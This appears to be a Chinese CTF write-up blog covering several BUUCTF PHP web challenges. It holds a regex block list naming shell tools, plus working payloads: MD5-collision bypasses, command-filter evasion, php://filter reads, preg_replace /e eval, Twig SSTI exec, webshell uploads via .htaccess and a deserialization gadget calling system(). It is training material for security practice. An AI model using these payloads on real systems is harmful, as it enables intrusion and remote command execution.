class="string">"/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i"</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">    <span class="built_in">echo</span>(<span class="string">"forbid ~"</span>);</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((string)<span class="variable">$_POST</span>[<span class="string">'a'</span>] !== (string)<span class="variable">$_POST</span>[<span class="string">'b'</span>] &amp;&amp; md5(<span class="variable">$_POST</span>[<span class="string">'a'</span>]) === md5(<span class="variable">$_POST</span>[<span class="string">'b'</span>])) &#123;</span><br><span class="line">        <span class="built_in">echo</span> `<span class="variable">$cmd</span>`;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">echo</span> (<span class="string">"md5 is funny ~"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>可以看到有个flag,但是被过滤了,不过在代码下方发现了很重要的东西</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> `<span class="variable">$cmd</span>`;</span><br></pre></td></tr></table></figure>
+<p>反引号啊，意味着命令执行啊，但是好多系统命令都被过滤了，而且还要绕过md5强类型比较<br>md5强类型比较去网上找了一个大佬的</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br></pre></td></tr></table></figure>
+<p>对于打印文件列表，虽然ls命令被过滤了，但很容易绕过，可用l\s<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/easy_web/easyweb1.jpg" alt=""><br>并没有发现flag,尝试ls一下根目录<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/easy_web/easyweb2.jpg" alt=""><br>发现了flag,现在需要读取flag，cat命令也被过滤了，还是老办法，反斜线绕过<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/easy_web/easyweb3.jpg" alt=""><br>这道题ls也可以用dir命令来代替</p>
+<h3 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h3><p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Unicornshop/Unicornshop1.jpg" alt=""><br>尝试买第一个<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Unicornshop/Unicornshop0.jpg" alt=""><br>说错误的商品，第二个和第三个也是这样，只有买第四个的时候不是这样<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Unicornshop/Unicornshop2.jpg" alt=""><br>只允许一个字符，额1337四个字符呢，那就需要是一个字符，而且还比1337大的数字，这就涉及Unicode的安全性了<br><a href="https://xz.aliyun.com/t/5402#toc-0" target="_blank" rel="noopener">https://xz.aliyun.com/t/5402#toc-0</a><br>可以在<a href="https://www.compart.com/en/unicode/mirrored这个网站找到我们需要的" target="_blank" rel="noopener">https://www.compart.com/en/unicode/mirrored这个网站找到我们需要的</a><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Unicornshop/Unicornshop3.jpg" alt=""><br>这个挺好看，就用这个了,而且5000也够了<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Unicornshop/Unicornshop4.jpg" alt=""><br>价格处输入：%E2%86%81<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Unicornshop/Unicornshop5.jpg" alt=""></p>
+<h3 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h3><p>源码没啥重要的信息，扫了一下目录，发现.git,看来有git源码泄露，GitHack把源码扒下来</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include<span class="string">'flag.php'</span>;</span><br><span class="line"><span class="variable">$yds</span> = <span class="string">"dog"</span>;</span><br><span class="line"><span class="variable">$is</span> = <span class="string">"cat"</span>;</span><br><span class="line"><span class="variable">$handsome</span> = <span class="string">'yds'</span>; //看到这就能想到变量覆盖了</span><br><span class="line">foreach(<span class="variable">$_POST</span> as <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    $<span class="variable">$x</span> = <span class="variable">$y</span>;</span><br><span class="line">&#125;</span><br><span class="line">foreach(<span class="variable">$_GET</span> as <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123; //漏洞点</span><br><span class="line">    $<span class="variable">$x</span> = $<span class="variable">$y</span>;</span><br><span class="line">&#125;</span><br><span class="line">foreach(<span class="variable">$_GET</span> as <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123; </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">'flag'</span>] === <span class="variable">$x</span> &amp;&amp; <span class="variable">$x</span> !== <span class="string">'flag'</span>)&#123; //get参数的键不能是flag,值还必须是flag</span><br><span class="line">        <span class="built_in">exit</span>(<span class="variable">$handsome</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!isset(<span class="variable">$_GET</span>[<span class="string">'flag'</span>]) &amp;&amp; !isset(<span class="variable">$_POST</span>[<span class="string">'flag'</span>]))&#123; //只要get 或者 post的参数flag就行</span><br><span class="line">    <span class="built_in">exit</span>(<span class="variable">$yds</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">'flag'</span>] === <span class="string">'flag'</span>  || <span class="variable">$_GET</span>[<span class="string">'flag'</span>] === <span class="string">'flag'</span>)&#123; //不论是get 还是 post都不能出现flag=flag</span><br><span class="line">    <span class="built_in">exit</span>(<span class="variable">$is</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"the flag is: "</span>.<span class="variable">$flag</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>根据上面的分析，可构造如下Payload:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST: <span class="variable">$flag</span>=flag</span><br><span class="line">GET:  yds=flag</span><br></pre></td></tr></table></figure>
+<p>分析如下：<br>想办法输出$flag<br>第一个foreach语句：$$flag=$flag,即$$flag=flag<br>第二个foreach语句：$yds=$flag,这很重要，为下面利用做准备<br>第三个foreach语句中的if语句：没有get一个flag,所以这层过滤直接失效<br>第一个if语句：if条件为假，输出$yds，而此时的$yds=$flag，刚好就是我们要的<br>最后在源码中得到flag</p>
+<h3 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h3><p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Themysteryofip/ip0.jpg" alt=""><br>能够获取我们的ip<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Themysteryofip/ip1.jpg" alt=""><br>提示说你知道为什么我知道你的ip吗，第一反应哪里会有命令执行，bp抓个包<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Themysteryofip/ip2.jpg" alt=""><br>看来不是命令执行，然后扫了一下目录，有个.DS_Store,里面也没啥东西<br>看大佬wp说是有SSTI,啊这。。。，我tcl,之前还专门去看过SSTI,题做得还是太少，总结的太少了，唉<br>先测试一下是不是有SSTI<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Themysteryofip/ip3.jpg" alt=""><br>还真有，那就先列一下目录<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Themysteryofip/ip4.jpg" alt=""><br>发现flag,cat一下<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Themysteryofip/ip5.jpg" alt=""></p>
+<h3 id="BJDCTF2020-ZJCTF，不过如此"><a href="#BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF2020]ZJCTF，不过如此"></a>[BJDCTF2020]ZJCTF，不过如此</h3><p>给了源码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"><span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">"text"</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">"file"</span>];</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$text</span>)&amp;&amp;(file_get_contents(<span class="variable">$text</span>,<span class="string">'r'</span>)===<span class="string">"I have a dream"</span>))&#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"&lt;br&gt;&lt;h1&gt;"</span>.file_get_contents(<span class="variable">$text</span>,<span class="string">'r'</span>).<span class="string">"&lt;/h1&gt;&lt;/br&gt;"</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        die(<span class="string">"Not now!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    include(<span class="variable">$file</span>);  //next.php</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>get传入text和file，text的内容为I have a dream,file中不能有flag<br>text可用data协议绕过，然后用伪协议读取next.php<br>Payload:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?text=data://text/plain,I have a dream&amp;file=php://filter/convert.base64-encode/resource=next.php</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/ZJCTFbgrc/ZGCTFbgrc0.jpg" alt=""></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">'id'</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">'id'</span>] = <span class="variable">$id</span>;</span><br><span class="line"><span class="keyword">function</span> complex(<span class="variable">$re</span>, <span class="variable">$str</span>) &#123;</span><br><span class="line">    <span class="built_in">return</span> preg_replace(</span><br><span class="line">        <span class="string">'/('</span> . <span class="variable">$re</span> . <span class="string">')/ei'</span>,</span><br><span class="line">        <span class="string">'strtolower("\\1")'</span>,</span><br><span class="line">        <span class="variable">$str</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line">foreach(<span class="variable">$_GET</span> as <span class="variable">$re</span> =&gt; <span class="variable">$str</span>) &#123;</span><br><span class="line">    <span class="built_in">echo</span> complex(<span class="variable">$re</span>, <span class="variable">$str</span>). <span class="string">"\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">getFlag</span></span>()&#123;</span><br><span class="line">	@<span class="built_in">eval</span>(<span class="variable">$_GET</span>[<span class="string">'cmd'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>preg_replace()函数/e模式下有命令执行漏洞，这篇文章讲的很详细：<a href="https://xz.aliyun.com/t/2557" target="_blank" rel="noopener">https://xz.aliyun.com/t/2557</a><br>想办法让它调用getFlag()函数，从而在参数cmd中构造命令执行<br>Payload:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?\S*=<span class="variable">$&#123;getFlag()&#125;</span>&amp;cmd=system(<span class="string">"ls /"</span>);</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/ZJCTFbgrc/ZGCTFbgrc1.jpg" alt=""><br>cat一下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?\S*=<span class="variable">$&#123;getFlag()&#125;</span>&amp;cmd=system(<span class="string">"cat /flag"</span>);</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/ZJCTFbgrc/ZGCTFbgrc2.jpg" alt=""></p>
+<h3 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h3><p>和之前[BJDCTF2020]The mystery of ip这道题很像<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Cookieissostable/Cookieissostable0.jpg" alt=""><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Cookieissostable/Cookieissostable1.jpg" alt=""><br>看来这道题关键点在Cookie,bp抓一下包<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Cookieissostable/Cookieissostable3.jpg" alt=""><br>set-Cookie中有个user=admin,很有可能就是注入点，在Cookie中设置一下user，再发包<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Cookieissostable/Cookieissostable2.jpg" alt=""><br>测试一下是不是SSTI：49，返回49，则是Twig模板<br>存在SSTI,且是Twig模板<br>Payload:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(<span class="string">"exec"</span>)&#125;&#125;&#123;&#123;_self.env.getFilter(<span class="string">"cat /flag"</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Cookieissostable/Cookieissostable4.jpg" alt=""></p>
+<h3 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">I put something <span class="keyword">in</span> F12 <span class="keyword">for</span> you</span><br><span class="line">include <span class="string">'flag.php'</span>;</span><br><span class="line"><span class="variable">$flag</span>=<span class="string">'MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;'</span>;</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">'gg'</span>])&amp;&amp;isset(<span class="variable">$_GET</span>[<span class="string">'id'</span>])) &#123;</span><br><span class="line">    <span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">'id'</span>];</span><br><span class="line">    <span class="variable">$gg</span>=<span class="variable">$_GET</span>[<span class="string">'gg'</span>];</span><br><span class="line">    <span class="keyword">if</span> (md5(<span class="variable">$id</span>) === md5(<span class="variable">$gg</span>) &amp;&amp; <span class="variable">$id</span> !== <span class="variable">$gg</span>) &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">'You got the first step'</span>;</span><br><span class="line">        <span class="keyword">if</span>(isset(<span class="variable">$_POST</span>[<span class="string">'passwd'</span>])) &#123;</span><br><span class="line">            <span class="variable">$passwd</span>=<span class="variable">$_POST</span>[<span class="string">'passwd'</span>];</span><br><span class="line">            <span class="keyword">if</span> (!is_numeric(<span class="variable">$passwd</span>))&#123;</span><br><span class="line">                 <span class="keyword">if</span>(<span class="variable">$passwd</span>==1234567)&#123;</span><br><span class="line">                     <span class="built_in">echo</span> <span class="string">'Good Job!'</span>;</span><br><span class="line">                     highlight_file(<span class="string">'flag.php'</span>);</span><br><span class="line">                     die(<span class="string">'By Retr_0'</span>);</span><br><span class="line">                 &#125;</span><br><span class="line">                 <span class="keyword">else</span>&#123;</span><br><span class="line">                     <span class="built_in">echo</span> <span class="string">"can you think twice??"</span>;</span><br><span class="line">                 &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">echo</span> <span class="string">'You can not get it !'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            die(<span class="string">'only one way to get the flag'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"You are not a real hacker!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    die(<span class="string">'Please input first'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;You got the first steponly one way to get the flag</span><br></pre></td></tr></table></figure>
+<p>第一步：md5强类型比较绕过，前几天刚遇到过,直接拿过来用</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;gg=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br></pre></td></tr></table></figure>
+<p>第二步：弱类型比较</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd=1234567zx</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Ez_bypass/easy_bypass.jpg" alt=""></p>
+<h3 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h3><p>先上传phtml文件<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/BabyUpload/BabyUpload0.jpg" alt=""><br>把ph过滤了，那没法用php相关后缀的马了<br>尝试上传.htaccess<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/BabyUpload/BabyUpload1.jpg" alt=""><br>然后上传个图片马<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/BabyUpload/BabyUpload2.jpg" alt=""><br>啊这，根据以往经验，应该是过滤了&lt;?，改用js调用php的图片马<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/BabyUpload/BabyUpload3.jpg" alt=""><br>蚁剑直接连，在根目录发现flag,最初是想直接在终端cat出来，但是命令行被ban了<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/BabyUpload/BabyUpload4.jpg" alt=""></p>
+<h3 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h3><p>普通马被过滤,看一下服务器，是Apache<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/YouSendYouMa/yousend0.jpg" alt=""><br>上传.htaccess<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/YouSendYouMa/yousend1.jpg" alt=""><br>然后上传图片马<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/YouSendYouMa/yousend2.jpg" alt=""><br>蚁剑直接连，根目录发现flag</p>
+<h3 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h3><p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/phpweb/phpweb0.jpg" alt=""><br>对date()函数报了一些警告，用burp抓一下包<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/phpweb/phpweb1.jpg" alt=""><br>可以看出参数func就是调用的函数名<br>date():<a href="https://www.w3school.com.cn/php/func_date_date.asp" target="_blank" rel="noopener">https://www.w3school.com.cn/php/func_date_date.asp</a><br>了解一下date()函数后，可以看出参数p应该就是被调用函数的参数<br>那么可以尝试读取一下index.php</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">func=file_get_contents&amp;p=index.php</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/phpweb/phpweb2.jpg" alt=""></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    <span class="variable">$disable_fun</span> = array(<span class="string">"exec"</span>,<span class="string">"shell_exec"</span>,<span class="string">"system"</span>,<span class="string">"passthru"</span>,<span class="string">"proc_open"</span>,<span class="string">"show_source"</span>,<span class="string">"phpinfo"</span>,<span class="string">"popen"</span>,<span class="string">"dl"</span>,<span class="string">"eval"</span>,<span class="string">"proc_terminate"</span>,<span class="string">"touch"</span>,<span class="string">"escapeshellcmd"</span>,<span class="string">"escapeshellarg"</span>,<span class="string">"assert"</span>,<span class="string">"substr_replace"</span>,<span class="string">"call_user_func_array"</span>,<span class="string">"call_user_func"</span>,<span class="string">"array_filter"</span>, <span class="string">"array_walk"</span>,  <span class="string">"array_map"</span>,<span class="string">"registregister_shutdown_function"</span>,<span class="string">"register_tick_function"</span>,<span class="string">"filter_var"</span>, <span class="string">"filter_var_array"</span>, <span class="string">"uasort"</span>, <span class="string">"uksort"</span>, <span class="string">"array_reduce"</span>,<span class="string">"array_walk"</span>, <span class="string">"array_walk_recursive"</span>,<span class="string">"pcntl_exec"</span>,<span class="string">"fopen"</span>,<span class="string">"fwrite"</span>,<span class="string">"file_put_contents"</span>);</span><br><span class="line">    <span class="keyword">function</span> gettime(<span class="variable">$func</span>, <span class="variable">$p</span>) &#123;</span><br><span class="line">        <span class="variable">$result</span> = call_user_func(<span class="variable">$func</span>, <span class="variable">$p</span>);</span><br><span class="line">        <span class="variable">$a</span>= gettype(<span class="variable">$result</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$a</span> == <span class="string">"string"</span>) &#123;</span><br><span class="line">            <span class="built_in">return</span> <span class="variable">$result</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;<span class="built_in">return</span> <span class="string">""</span>;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    class Test &#123;</span><br><span class="line">        var <span class="variable">$p</span> = <span class="string">"Y-m-d h:i:s a"</span>;</span><br><span class="line">        var <span class="variable">$func</span> = <span class="string">"date"</span>;</span><br><span class="line">        <span class="keyword">function</span> <span class="function"><span class="title">__destruct</span></span>() &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$this</span>-&gt;func != <span class="string">""</span>) &#123;</span><br><span class="line">                <span class="built_in">echo</span> gettime(<span class="variable">$this</span>-&gt;func, <span class="variable">$this</span>-&gt;p);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$func</span> = <span class="variable">$_REQUEST</span>[<span class="string">"func"</span>];</span><br><span class="line">    <span class="variable">$p</span> = <span class="variable">$_REQUEST</span>[<span class="string">"p"</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$func</span> != null) &#123;</span><br><span class="line">        <span class="variable">$func</span> = strtolower(<span class="variable">$func</span>);</span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$func</span>,<span class="variable">$disable_fun</span>)) &#123;</span><br><span class="line">            <span class="built_in">echo</span> gettime(<span class="variable">$func</span>, <span class="variable">$p</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            die(<span class="string">"Hacker..."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>禁用了一大堆函数，但是有个很特别的东西：Test类中的两个成员属性恰好是要传入的参数名，且在类中有个<strong>destruct()魔术方法，会在反序列化结束时调用,在</strong>destruct()里面调用了gettime(),其参数就是Test类的两个成员属性,而且gettime并没有过滤disable_fun,这就很nice,可以通过反序列化函数unserialize()执行__destruct()函数，从而调用gettime函数，达到执行命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Test &#123;</span><br><span class="line">        var <span class="variable">$p</span> = <span class="string">"ls"</span>;</span><br><span class="line">        var <span class="variable">$func</span> = <span class="string">"system"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="variable">$a</span>=new Test();</span><br><span class="line"><span class="built_in">echo</span> serialize(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>
